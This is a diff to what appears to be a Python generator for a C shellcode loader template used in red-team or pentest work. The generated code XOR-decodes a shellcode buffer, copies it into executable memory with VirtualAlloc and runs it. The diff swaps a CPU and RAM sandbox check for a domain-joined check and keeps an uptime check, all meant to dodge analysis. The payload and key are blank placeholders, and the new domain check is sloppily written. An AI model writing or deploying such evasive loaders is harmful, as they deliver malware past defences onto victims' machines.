@@ -36,52 +36,54 @@ def create_template():
 #pragma comment(linker, "/INCREMENTAL:YES")
 #pragma comment(lib, "user32.lib")
 #define WIN32_LEAN_AND_MEAN
+#define MAX_BUFFER_SIZE 512
+#define SECURITY_WIN32
+#define __WIN32_WINNT 0x0A00
+#include <secext.h>
+#include <Security.h>
 
-BOOL aynenKardesim() {
-  SYSTEM_INFO inf;
-  MEMORYSTATUSEX memStat;
-  DWORD proc;
-  DWORD belleq;
 
-  GetSystemInfo(&inf);
-  proc = inf.dwNumberOfProcessors;
-  if (proc < 2) return false;
+BOOL Isdomainjoined(LPCWSTR domain) {
+    WCHAR buffer[MAX_BUFFER_SIZE];
+    GetEnvironmentVariable(L"USERDOMAIN", buffer, 256);
+    BOOL bResult = FALSE;
+    DWORD dwSize = MAX_BUFFER_SIZE;
+    WCHAR* position = wcsstr(buffer, L"\\");
 
-  memStat.dwLength = sizeof(memStat);
-  GlobalMemoryStatusEx(&memStat);
-  belleq = memStat.ullTotalPhys / 1024 / 1024 / 1024;
-  if (belleq < 2) return false;
+    position[0] = 0x00;
+    if (wcscmp(domain, buffer) == 0) {
+        bResult = TRUE;
+    }
 
-  return true;
+    return bResult;
 }
 
 int main(int argc, char** argv)
 {
-	
-	if (aynenKardesim() == false) {
-    return -2;
+
+    if (!Isdomainjoined(L"//CHANGETHISFORDOMAIN")) {
     }
-    else{
-  
-	ULONGLONG uptime = GetTickCount() / 1000;
-	if (uptime < 1200) return false;
-		
+    else {
+
+        ULONGLONG uptime = GetTickCount() / 1000;
+        if (uptime < 1200) return false;
+
         unsigned char buf[] = " ";
         char key[] = " ";
         char shellcode[sizeof buf];
         int j = 0;
         for (int i = 0; i < sizeof buf; i++)
         {
-            if(j == sizeof key -1 ) j = 0;
+            if (j == sizeof key - 1) j = 0;
             shellcode[i] = buf[i] ^ key[j];
             j++;
         }
-        
-        void* kardeslerpentest = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-        memcpy(kardeslerpentest, shellcode, sizeof shellcode);
-        ((void(*)())kardeslerpentest)();
+
+        void* bigedrenergy = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+        memcpy(bigedrenergy, shellcode, sizeof shellcode);
+        ((void(*)())bigedrenergy)();
         return 0;
-       }
+    }
 }
 ''')
     template.close()
